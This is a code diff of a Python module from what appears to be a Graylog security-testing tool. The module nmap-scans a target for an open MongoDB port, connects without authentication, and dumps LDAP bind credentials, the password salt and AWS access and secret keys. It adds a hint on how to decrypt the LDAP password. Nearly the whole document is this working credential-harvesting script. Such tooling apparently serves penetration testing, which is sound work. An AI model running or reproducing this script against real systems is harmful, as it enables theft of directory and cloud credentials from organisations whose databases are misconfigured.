@@ -2,60 +2,84 @@
 
 # Graylog Test Connection to MongoDB without Authentication and Read Sensitive Information
 
-#%%%%%%%%%%% Libraries %%%%%%%%%%%#
+# %%%%%%%%%%% Libraries %%%%%%%%%%%#
 
 import colorama
-colorama.init()
+import logging
+import nmap
 from colorama import Fore, Style
 from pymongo import MongoClient
 from pymongo.errors import ConnectionFailure
 
-#%%%%%%%%%%% Constants %%%%%%%%%%%#
+colorama.init()
 
-separator = "[*] ============================================================================================================== [*]"
+# %%%%%%%%%%% Constants %%%%%%%%%%%#
 
-#%%%%%%%%%% Functions %%%%%%%%%#
+SEPARATOR = "[*] {0} [*]".format('=' * 110)
+MONGODB_PORT = 27017
 
-def testmongocredentials(graylogip):
+# %%%%%%%%%% Functions %%%%%%%%%#
 
-    try:
-        client = MongoClient(graylogip, 27017)
-        db = client.graylog
-        print(separator)
-        print(Fore.RED+Style.BRIGHT+"[!] Mongo DB without Authentication"+Style.RESET_ALL)
-        print(separator)
-        print("[!] LDAP Settings")
-        print(separator)
+def test_mongo_credentials(graylogip):
 
-        ldapusername = list(db.ldap_settings.find({},{'system_username': 1,'_id':0}))
-        ldappass = list(db.ldap_settings.find({}, {'system_password': 1, '_id': 0}))
-        ldapsalt = list(db.ldap_settings.find({}, {'system_password_salt': 1, '_id': 0}))
-        ldapuri = list(db.ldap_settings.find({}, {'ldap_uri': 1, '_id': 0}))
+	nm = nmap.PortScanner()
 
-        print("[!] " + (str(ldapusername)).strip(' [{}]'))
-        print("[!] " + (str(ldappass)).strip(' [{}]'))
-        print("[!] " + (str(ldapsalt)).strip(' [{}]'))
-        print("[!] " + (str(ldapuri)).strip(' [{}]'))
+	try:
+		nm.scan(hosts = graylogip, arguments = '-sT -T4 -p 27017')
 
-        print(separator)
-        print("[!] LDAP Password Encrypted with AES CBC, Key is Graylog PasswordSecret and IV is the Salt")
+		if nm[graylogip]['tcp'][MONGODB_PORT]['state'] == 'open':
 
-        awsaccesskey = list(db.cluster_config.find({'type':'org.graylog.aws.config.AWSPluginConfiguration'},{'payload.access_key':1,'_id':0}))
-        accesskey = str(awsaccesskey).replace('payload','').strip('[{}]').replace("'': {",'')
-        awssecretkey = list(db.cluster_config.find({'type': 'org.graylog.aws.config.AWSPluginConfiguration'},{'payload.secret_key': 1, '_id': 0}))
-        secretkey = str(awssecretkey).replace('payload', '').strip('[{}]').replace("'': {", '')
+			try:
+				client = MongoClient(graylogip, MONGODB_PORT)
+				db = client.graylog
+				print(SEPARATOR)
+				print(Fore.RED + Style.BRIGHT + "[!] Mongo DB without Authentication" + Style.RESET_ALL)
+				print(SEPARATOR)
+				print("[!] LDAP Settings")
+				print(SEPARATOR)
 
-        print(separator)
-        print("[!] AWS Access Key and Secret Key")
-        print(separator)
-        print("[!] " + accesskey)
-        print("[!] " + secretkey)
-        print(separator)
+				ldapusername = list(db.ldap_settings.find({}, {'system_username': 1, '_id': 0}))
+				ldappass = list(db.ldap_settings.find({}, {'system_password': 1, '_id': 0}))
+				ldapsalt = list(db.ldap_settings.find({}, {'system_password_salt': 1, '_id': 0}))
+				ldapuri = list(db.ldap_settings.find({}, {'ldap_uri': 1, '_id': 0}))
 
-    except ConnectionFailure:
-        print(separator)
-        print("[!] Problem with MongoDB Authentication")
-        print(separator)
-        pass
+				print("[!] " + (str(ldapusername)).strip(' [{}]'))
+				print("[!] " + (str(ldappass)).strip(' [{}]'))
+				print("[!] " + (str(ldapsalt)).strip(' [{}]'))
+				print("[!] " + (str(ldapuri)).strip(' [{}]'))
 
-#%%%%%%%%%% The End %%%%%%%%%%#
+				print(SEPARATOR)
+				print(
+					"[!] LDAP Password Encrypted with AES CBC, Key is Graylog PasswordSecret and IV" 
+					" is the Salt")
+
+				awsaccesskey = list(
+					db.cluster_config.find({'type': 'org.graylog.aws.config.AWSPluginConfiguration'},
+											{'payload.access_key': 1, '_id': 0}))
+				accesskey = str(awsaccesskey).replace('payload', '').strip('[{}]').replace("'': {", '')
+				awssecretkey = list(
+					db.cluster_config.find({'type': 'org.graylog.aws.config.AWSPluginConfiguration'},
+											{'payload.secret_key': 1, '_id': 0}))
+				secretkey = str(awssecretkey).replace('payload', '').strip('[{}]').replace("'': {", '')
+
+				print(SEPARATOR)
+				print("[!] AWS Access Key and Secret Key")
+				print(SEPARATOR)
+				print("[!] " + accesskey)
+				print("[!] " + secretkey)
+				print(SEPARATOR)
+
+			except ConnectionFailure:
+				print(SEPARATOR)
+				print("[!] Problem with MongoDB Authentication")
+				print(SEPARATOR)
+
+		else:
+			print(SEPARATOR)
+			print("[!] MongoDB port is closed or unreachable")
+			print(SEPARATOR)
+
+	except Exception as e:
+		logging.error(e, exc_info = True)
+
+# %%%%%%%%%% The End %%%%%%%%%%#
